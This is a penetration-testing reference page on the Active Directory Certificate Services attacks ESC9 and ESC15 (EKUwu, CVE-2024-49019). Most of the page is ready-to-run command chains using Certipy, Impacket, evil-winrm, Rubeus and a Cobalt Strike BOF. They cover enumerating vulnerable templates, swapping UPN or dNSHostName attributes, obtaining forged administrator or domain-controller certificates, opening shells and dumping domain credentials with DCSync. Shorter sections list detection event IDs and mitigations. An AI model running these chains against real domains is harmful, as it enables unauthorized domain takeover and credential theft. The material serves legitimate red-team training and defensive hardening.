---
title: "ESC9 — No Security Extension (Template-Level)"
description: "ESC9 is the template-level version of ESC16. Where ESC16 disabled the szOID_NTDS_CA_SECURITY_EXT SID extension globally across every certificate on the…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs"]
tools: ["NetExec", "Impacket", "Rubeus", "Certipy", "BloodHound"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC9 — No Security Extension (Template-Level).md"
---
# ESC9 — No Security Extension (Template-Level)

> **Note:** ESC15 (EKUwu / CVE-2024-49019) now has its own standalone file — see ESC15 — EKUwu (CVE-2024-49019).

## What Is ESC9?

ESC9 is the **template-level version of ESC16**. Where ESC16 disabled the `szOID_NTDS_CA_SECURITY_EXT` SID extension **globally across every certificate on the CA**, ESC9 disables it on a **per-template basis** using the flag `CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`) in the template's `msPKI-Enrollment-Flag` attribute. The impact is identical — certificates issued from that template carry no objectSid binding — but it's scoped to one template rather than the entire CA.

The attack chain is also nearly identical to ESC16 — you need `GenericWrite` over an account with enrollment rights, temporarily swap its UPN, request a cert, restore the UPN — but here you're targeting a **specific misconfigured template** rather than relying on a CA-wide flag.

ESC9 has **two distinct variants**:

| Variant | What Gets Swapped | Target Identity Field |
|---------|------------------|-----------------------|
| **ESC9a** | `userPrincipalName` (UPN) | UPN SAN in cert |
| **ESC9b** | `dNSHostName` | DNS SAN in cert |

ESC9a targets **user account impersonation**, ESC9b targets **machine account impersonation** — same logical split as ESC16 vs Certifried.

***

## Required Conditions

| Condition | Notes |
|-----------|-------|
| Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag set | `msPKI-Enrollment-Flag` contains `0x80000` |
| Template has **Client Authentication EKU** | `Client Authentication: True` |
| `StrongCertificateBindingEnforcement` set to **0 or 1** on DCs | Not `2` — which would block UPN-based mapping  |
| Attacker has **`GenericWrite`** over an account with enrollment rights | BloodHound ACE edge |
| That account can enroll in the vulnerable template | Enrollment Rights includes the account |

> ⚠️ `StrongCertificateBindingEnforcement = 2` **blocks ESC9** — the DC enforces SID binding. If you see value `2`, ESC9 is not exploitable. This is why ESC16 is more dangerous — it operates at the CA level, bypassing KDC enforcement entirely.

***

## Step 0 — Enumeration

```bash
# Standard vulnerable scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# Check StrongCertificateBindingEnforcement on DC
netexec smb $TARGET -u 'lowpriv' -p 'Password123!' \
  -x 'reg query HKLM\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement'
# 0 or 1 = ESC9 works
# 2       = ESC9 blocked
```

### What Vulnerable ESC9 Output Looks Like

```
Certificate Templates
  Template Name                       : ESC9-Template
  Enabled                             : True
  Client Authentication               : True
  Enrollee Supplies Subject           : False
  Extended Key Usage                  : Client Authentication
  Requires Manager Approval           : False
  Authorized Signatures Required      : 0
  Enrollment Flag                     : NO_SECURITY_EXTENSION   ← ⚠️ KEY FLAG
  Permissions
    Enrollment Rights : DOMAIN\Domain Users

[!] Vulnerabilities
  ESC9 : 'DOMAIN\Domain Users' can enroll, template has
         CT_FLAG_NO_SECURITY_EXTENSION and no SID extension will be included
```

> 💡 The critical tell is `NO_SECURITY_EXTENSION` in the `Enrollment Flag` field — this is `CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`).

***

## ESC9a Full Attack Chain — Linux (UPN Swap)

This is functionally identical to the ESC16 chain from the Fluffy walkthrough — just targeting a specific template.

### Step 1 — Identify Controlled Account + Note Current UPN
```bash
# Find your GenericWrite target
certipy-ad account \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -user 'targetuser' \
  lookup

# Note the current UPN e.g. targetuser@domain.htb — needed for restoration
```

### Step 2 — Swap UPN to Target Identity
```bash
certipy-ad account \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -user 'targetuser' \
  -upn 'administrator' \
  update

# [*] Successfully updated 'targetuser' with 'userPrincipalName' = 'administrator'
```

### Step 3 — Request Cert from ESC9 Template
```bash
certipy-ad req \
  -u 'targetuser@domain.htb' \
  -p 'TargetPassword!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'ESC9-Template'

# [*] Got certificate with UPN 'administrator'
# [*] Saving certificate and private key to 'administrator.pfx'
```

### Step 4 — IMMEDIATELY Restore UPN
```bash
certipy-ad account \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -user 'targetuser' \
  -upn 'targetuser@domain.htb' \
  update
```

### Step 5 — Authenticate
```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# Output: administrator.ccache + NT hash
```

### Step 6 — Shell
```bash
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
evil-winrm -i $TARGET -u administrator -H <NTHASH>
```

***

## ESC9b — DNS SAN Variant (Machine Account Impersonation)

For machine account impersonation, swap `dNSHostName` instead of UPN:

```bash
# Step 1: Clear SPNs on controlled machine account
certipy-ad account \
  -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -user 'EVILPC$' -spn-clear update

# Step 2: Swap dNSHostName to DC hostname
certipy-ad account \
  -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -user 'EVILPC$' \
  -dns 'DC01.domain.htb' update

# Step 3: Request Machine cert from ESC9 template
certipy-ad req \
  -u 'EVILPC$@domain.htb' -p 'EvilPass!' \
  -dc-ip $TARGET -ca 'DOMAIN-CA-NAME' \
  -template 'ESC9-Template'

# Step 4: Restore dNSHostName
certipy-ad account \
  -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -user 'EVILPC$' \
  -dns 'EVILPC.domain.htb' update

# Step 5: Authenticate as DC01$
certipy-ad auth -pfx 'dc01.pfx' -username 'DC01$' \
  -domain domain.htb -dc-ip $TARGET

# Step 6: DCSync
export KRB5CCNAME='DC01$.ccache'
secretsdump.py -k -no-pass DC01.domain.htb
```

***

## ESC9 vs ESC16

| | ESC9 | ESC16 |
|---|---|---|
| **Flag location** | Per-template `msPKI-Enrollment-Flag` | CA-wide `DisableExtensionList` |
| **Templates affected** | One specific template | Every template on that CA |
| **`StrongCertificateBindingEnforcement = 2` blocks it?** | ✅ Yes | ❌ No — SID never embedded at source |
| **Certipy detection** | Template-level ESC9 flag | CA-level ESC16 flag |
| **Attack chain** | UPN/DNS swap → req → restore | UPN/DNS swap → req → restore (identical) |

***

## ESC9 Mitigation

- **Remove `CT_FLAG_NO_SECURITY_EXTENSION`** from any template that has it set — there is no legitimate business reason to disable SID embedding on a per-template basis
- **Set `StrongCertificateBindingEnforcement = 2`** on all DCs — enforces SID validation, breaking ESC9
- **Audit `GenericWrite` ACEs** on accounts with enrollment rights — pre-condition for this entire attack class

***
***

# ESC15 — EKUwu (CVE-2024-49019)

## What Is ESC15?

ESC15, nicknamed **EKUwu**, was discovered by **Justin Bollinger at TrustedSec** in late September 2024 and assigned **CVE-2024-49019** by Microsoft on November 12, 2024. It is fundamentally different from every other ESC attack — **it is not a misconfiguration**. It is a **software vulnerability in Microsoft's implementation of Application Policies in schema version 1 certificate templates**.

Every other ESC attack requires an admin to have configured something incorrectly. ESC15 exploits a bug in how the CA processes **Certificate Signing Requests (CSRs) against schema version 1 templates** — templates that Microsoft itself ships as defaults. The bug allows an attacker to **inject arbitrary Application Policy OIDs into their CSR** that the CA will honour and embed in the issued certificate, even if the template itself never specified those policies.

In practical terms: you enroll in a harmless default template, inject `Client Authentication` OID into your CSR, and the CA issues a certificate that can authenticate you as any domain user — including Domain Admin.

***

## Why Schema Version 1 Is Special

The entire vulnerability hinges on a behavioural difference between schema versions:

| Schema Version | Application Policy Behaviour |
|---|---|
| **Version 1** | CA accepts Application Policies **supplied in the CSR** — attacker controlled |
| **Version 2+** | CA ignores CSR-supplied Application Policies — uses only what's defined in the template |

Version 1 templates are legacy — predating the modern PKI hardening model. They exist because early Active Directory needed them and Microsoft has never forcibly migrated environments away from them. The attack specifically targets the `msPKI-Certificate-Application-Policy` attribute handling in v1 template processing.

***

## Default Vulnerable Templates

Because ESC15 targets schema version 1 templates, it can affect **default Microsoft-provided templates** — no admin misconfiguration required:

| Template | Default Enrollment Rights | Notes |
|----------|--------------------------|-------|
| `WebServer` | Administrators | Common for internal HTTPS — often over-permissioned |
| `SubCA` | Administrators | ESC7 territory — admin enroll only |
| `CA` | Administrators | Same |
| `User` | Domain Users | ⚠️ **High risk** — every domain user can enroll |
| `Machine` | Domain Computers | ⚠️ **High risk** — every machine can enroll |
| `DomainController` | Domain Controllers | DC certs |

> 💡 The `User` and `Machine` templates being schema version 1 AND enrollable by all domain users/computers is what makes ESC15 so impactful — no template customisation needed at all.

***

## Required Conditions

| Condition | Notes |
|-----------|-------|
| Template uses **Schema Version 1** | Check `Schema Version: 1` in certipy output |
| Template has **`Enrollee Supplies Subject`** enabled | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` — same as ESC1 |
| Low-priv users can enroll | Standard enrollment rights check |
| **Unpatched** (pre-November 2024 KB5044281) | Check patch status |

> 💡 ESC15 was patched by Microsoft in **November 2024 (KB5044281)**. The patch restricts Application Policy injection in CSRs for schema version 1 templates. Always verify patch status before attempting.

***

## Step 0 — Enumeration

```bash
# Standard scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# Check for ESC15 specifically — look for Schema Version 1 + Enrollee Supplies Subject
# Certipy will flag this as ESC15 in vulnerable output
```

### What Vulnerable ESC15 Output Looks Like

```
Certificate Templates
  Template Name                       : User
  Schema Version                      : 1           ← KEY: Schema V1
  Enabled                             : True
  Client Authentication               : False       ← Not required! You'll inject it
  Enrollee Supplies Subject           : True         ← Needed for subject control
  Requires Manager Approval           : False
  Authorized Signatures Required      : 0
  Permissions
    Enrollment Rights : DOMAIN\Domain Users

[!] Vulnerabilities
  ESC15 : Template schema version is 1 and the template allows the
          enrollee to supply the subject and an application policy
```

***

## Full Attack Chain — Linux (Certipy)

Certipy's ESC15 support was added after TrustedSec's disclosure. The key flag is `-application-policies` which injects the arbitrary OID into the CSR.

### Step 1 — Request Cert with Injected Application Policy + Spoofed Subject

```bash
# Inject Client Authentication OID + specify Administrator as subject
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User' \
  -upn 'administrator@domain.htb' \
  -application-policies 'Client Authentication'

# Output: administrator.pfx
```

**What Certipy does under the hood:**
- Builds a CSR for the `User` template (schema v1)
- Injects `Client Authentication` OID (`1.3.6.1.5.5.7.3.2`) into `Application Policies` extension of the CSR
- Sets `SubjectAltName: UPN = administrator@domain.htb`
- CA honours both — issues cert with Client Auth EKU AND Administrator UPN

**Expected output:**
```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 14
[*] Got certificate with UPN 'administrator@domain.htb'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

> 💡 Unlike ESC9/ESC16, Certipy may report an `objectSid` here if the CA is patched — in that case ESC15 will be blocked at auth time. The absence of `Certificate has no object SID` in the output is actually a good sign — it means the cert is stronger.

***

### Step 2 — Authenticate

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# Output: administrator.ccache + NT hash
```

***

### Step 3 — Shell

```bash
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
evil-winrm -i DC01.domain.htb -r domain.htb
evil-winrm -i $TARGET -u administrator -H <NTHASH>
```

***

## Extended ESC15 Use Cases — Beyond Client Auth

TrustedSec's research showed ESC15 is more dangerous than ESC2 in some respects because you can inject **any** Application Policy OID:

```bash
# Code signing certificate — forge software signatures
certipy-ad req ... -application-policies 'Code Signing'

# Smart Card Logon
certipy-ad req ... -application-policies 'Smart Card Logon'

# Enrollment Agent (bridges into ESC3 territory)
certipy-ad req ... -application-policies 'Certificate Request Agent'

# Any Purpose — like ESC2
certipy-ad req ... -application-policies 'Any Purpose'
```

Each of these opens a completely different post-exploitation path from the same single vulnerability.

***

## Windows Attack Chain (Certify.exe + Custom CSR)

```powershell
# ESC15 from Windows requires crafting a custom CSR with injected Application Policy
# TrustedSec released BOFs (Beacon Object Files) for this

# Using their adcs_request BOF in Cobalt Strike:
adcs_request /template:User /upn:administrator /appolicies:"1.3.6.1.5.5.7.3.2"

# Or using the updated Certify fork from TrustedSec
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:User \
  /altname:administrator /applicationpolicies:"Client Authentication"

# Convert and authenticate as per ESC1 flow
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

***

## ESC15 vs ESC1 and ESC2

| | ESC1 | ESC2 | **ESC15** |
|---|---|---|---|
| **Root cause** | Template misconfiguration | Template misconfiguration | **Software bug in schema v1** |
| **Admin misconfiguration required?** | ✅ | ✅ | ❌ **No — default templates vulnerable** |
| **Injects EKU via** | Template has it pre-set | Template has Any Purpose | **CSR at request time** |
| **CVE assigned** | No | No | **CVE-2024-49019** |
| **Patched** | No patch | No patch | ✅ **November 2024 KB5044281** |
| **Can inject arbitrary EKUs?** | ❌ | ❌ | ✅ |
| **Schema version required** | Any | Any | **Version 1 only** |
| **Discovered by** | SpecterOps | SpecterOps | **TrustedSec (Justin Bollinger)** |

***

## ESC9 vs ESC16 vs ESC15 — The No-SID Cluster

These three attacks are closely related and often confused:

| | ESC9 | ESC16 | ESC15 |
|---|---|---|---|
| **No SID in cert?** | ✅ (template flag) | ✅ (CA-wide flag) | ❌ (SID may be present) |
| **Requires UPN swap?** | ✅ | ✅ | ❌ (inject UPN directly) |
| **Template version dependency** | Any | Any | **Schema V1 only** |
| **Bypasses `StrongCertificateBindingEnforcement = 2`?** | ❌ | ✅ | ❌ |
| **Patched by Microsoft?** | Partially | No specific patch | ✅ KB5044281 |

***

## Detection Indicators

**ESC9:**
- **Event ID 4738** — UPN modification on an account followed immediately by a cert request then another UPN modification
- **Event ID 4887** — Certificate issued where UPN differs from account's permanent UPN

**ESC15:**
- **Event ID 4887** — Certificate issued with `Client Authentication` EKU from a template (`User`, `Machine`) that doesn't have that EKU defined in its configuration
- **CSR inspection** — Monitor for CSRs containing `Application Policies` extensions not matching the requested template's defined policies
- **Microsoft Defender for Identity** — Has built-in ESC15 detection post-patch

***

## Mitigation

**ESC9:**
- Remove `CT_FLAG_NO_SECURITY_EXTENSION` from any template that has it
- Set `StrongCertificateBindingEnforcement = 2`
- Audit `GenericWrite` ACEs on accounts with enrollment rights

**ESC15:**
- **Apply KB5044281** (November 2024 patch) — direct fix
- **Migrate schema v1 templates to v2+** — removes the vulnerable code path entirely:
  ```powershell
  # In CA MMC: Template Properties → Compatibility tab
  # Change "Certification Authority" from "Windows 2000" to "Windows Server 2003" or later
  # This upgrades template to schema version 2
  ```
- **Restrict enrollment rights** on `User` and `Machine` templates — removing `Domain Users` from enrollment rights is the single fastest interim mitigation
- **Audit schema version 1 templates** in your environment:
  ```powershell
  Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
    -Filter {msPKI-Template-Schema-Version -eq 1} -Properties *
  ```

***

The ESC series is now comprehensively covered from ESC1 through ESC17 Netrunner. Where to next?

Sources
 ESC9 Privilege Escalation| ADCS Attack Series https://www.youtube.com/watch?v=pO1WA18apwo
 ADCS ESC9 – No Security Extension - Hacking Articles https://www.hackingarticles.in/adcs-esc9-no-security-extension/
 ADCS Attack Paths in BloodHound — Part 3 - Blog - SpecterOps https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac
 ESC15 (EKUwu)/CVE-2024-49019: Vulnerability in AD CS EKU ... https://www.cycraft.com/en/post/esc15-2024-49019-en-20250908
 EKUwu: Not just another AD CS ESC - TrustedSec https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc
 ESC15: The Evolution of ADCS Attacks https://abrictosecurity.com/esc15-the-evolution-of-adcs-attacks/
 Understanding ESC15: A New Privilege Escalation Vulnerability in ... https://www.precedecyber.com/blog/understanding-esc15-a-new-privilege-escalation-vulnerability-in-active-directory-certificate-services-adcs
 ESC15 Vulnerability: Identifying and Protecting Your AD CS PKI https://www.ravenswoodtechnology.com/esc15-vulnerability/
 An Expert Guide to Fortifying Active Directory Certificate Services ... https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/
 Preventing Privilege Escalation via Active Directory Certificate ... https://www.catonetworks.com/blog/cato-ctrl-preventing-privilege-escalation-via-active-directory-certificate-services-adcs/
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/
 Attacking AD CS ESC Vulnerabilities Using Metasploit https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html
 ESC9 - WIP - Pentest Everything - GitBook https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc9-wip
 ADCS Attacks Course - HTB Academy https://academy.hackthebox.com/course/preview/adcs-attacks
 Certificate templates | The Hacker Recipes https://www.thehacker.recipes/ad/movement/adcs/certificate-templates
